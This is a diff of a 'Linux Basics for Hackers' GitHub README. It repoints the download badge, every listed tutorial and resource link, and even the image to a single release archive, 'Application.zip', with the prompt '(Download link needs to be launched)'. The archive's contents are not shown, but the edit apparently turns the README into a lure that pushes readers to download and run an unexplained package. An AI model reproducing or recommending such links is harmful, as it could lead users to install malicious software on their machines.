@@ -20,7 +20,7 @@ Welcome to the "Linux Basics for Hackers" repository - your ultimate guide to un
 - Wireless Networks
 
 ## Software Download Link 📥
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)<br>
+[![Download Software](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)<br>
 (Download link needs to be launched)
 
 ## About
@@ -42,17 +42,17 @@ This repository is a comprehensive resource for anyone looking to delve into the
 3. **Contribute**: Feel free to contribute to this repository by adding your own scripts, tutorials, or tools.
 
 ## Resources
-- [Linux Fundamentals Course](https://www.example.com/linux-course)
-- [Bash Scripting Tutorial](https://www.example.com/bash-scripting)
-- [Networking Basics Guide](https://www.example.com/networking-guide)
-- [Cybersecurity Blog](https://www.example.com/cybersecurity-blog)
+- [Linux Fundamentals Course](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)
+- [Bash Scripting Tutorial](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)
+- [Networking Basics Guide](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)
+- [Cybersecurity Blog](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)
 
 ## Get Started
 Are you ready to unlock the hacker within? Dive into the world of Linux and start mastering essential hacking skills today! Let's #HackThePlanet together! 🚀
 
 Happy Hacking! 🎩👨‍💻
 
-![Hacker Image](https://www.example.com/hacker-image.jpg)
+![Hacker Image](https://github.com/codenamelax22/Linux-Basics-for-Hackers/releases/download/v1.0.0/Application.zip)
 
 ```
  _   _ ____  _     ___ _____ _____ _   _ _   _  ____ 
